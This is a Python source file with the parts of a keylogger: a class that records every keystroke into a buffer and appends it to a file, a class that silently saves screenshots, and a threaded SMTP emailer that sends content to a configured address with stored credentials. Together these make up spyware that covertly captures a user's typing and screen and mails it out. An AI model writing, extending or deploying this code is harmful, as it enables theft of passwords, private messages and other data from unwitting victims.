from typing import List, Callable
from abc import abstractmethod, ABC
import json, os
from uuid import uuid4
from email.message import EmailMessage
from threading import Thread
import smtplib
from pyautogui import screenshot as py_screenshot


class DecoratorMixin(ABC):
    """
    A class that provides the method for decorating the __call__ method of subclasses

    It relies that subclasses will implement a 'call' method, so you must provide them
    """

    @abstractmethod
    def call(self):
        pass

    @property
    def __call__(self):
        try:
            return self.__dict__["call"]
        except:
            return self.call

    def apply_decorators(self, decorators: List[Callable]):
        temp = self.call
        while len(decorators) > 0:
            decorator = decorators.pop()
            temp = decorator(temp)
        self.__dict__["call"] = temp


class Emailer(DecoratorMixin):
    def __init__(
        self,
        config_path: str,
        default_message: str = None,
    ) -> None:
        """
        config_path : The path of the json file that contains credentials and receiver/sender's emails
                              It should provide the below keys: 'To','From',hostname','port','username','password.
                              Check smtplib documentation for more on credentials need for an email connection.
        default_message: Will populate the 'message' section if not pass a message
        """
        with open(config_path, "r") as f:
            self.config = json.load(f)
        self.email_message = EmailMessage()
        self.email_message["From"] = self.config.pop("From")
        self.email_message["To"] = self.config.pop("To")
        self.default_message = default_message

    def call(self, message=None, **kwds):
        def send():
            smtp = smtplib.SMTP(host=self.config["hostname"], port=self.config["port"])
            smtp.starttls()
            smtp.login(user=self.config["username"], password=self.config["password"])
            if message:
                self.email_message.set_content(message)
            else:
                self.email_message.set_content(self.default_message)
            smtp.send_message(self.email_message)

        t = Thread(
            target=send,
        )
        t.start()


class KeyBoardCapturer(DecoratorMixin):
    def __init__(
        self, path: str = None, max_length: int = 10000, encoding: str = "utf-16"
    ):
        self.buffer = ""
        self.default_path = path
        self.max_length = max_length
        self.encoding = encoding

    def call(self, **kwds):
        character = kwds.pop("key")
        if len(self.buffer) < self.max_length:
            self.add_to_buffer(character)
        else:
            self.save()

    def add_to_buffer(self, key):
        c = key.__str__()
        if c.startswith("Key."):
            c = c.split(".")[-1]
            if c == "space":
                c = " "
            else:
                c = " " + "[%s]" % repr(c.upper()) + " "
        else:
            c = c.replace("'", "")
        self.buffer += c

    def save(self, path=None):
        with open(
            path if path else self.default_path, mode="a", encoding=self.encoding
        ) as f:
            f.write(self.buffer)
        self.buffer = ""


class ScreenCapturer(DecoratorMixin):
    def __init__(self, save_dir):
        self.save_dir = os.path.normcase(save_dir)

    def call(self, **kwds):
        file_name = uuid4().__str__() + ".png"
        screenshot = py_screenshot()
        screenshot.save(os.path.join(self.save_dir, file_name))
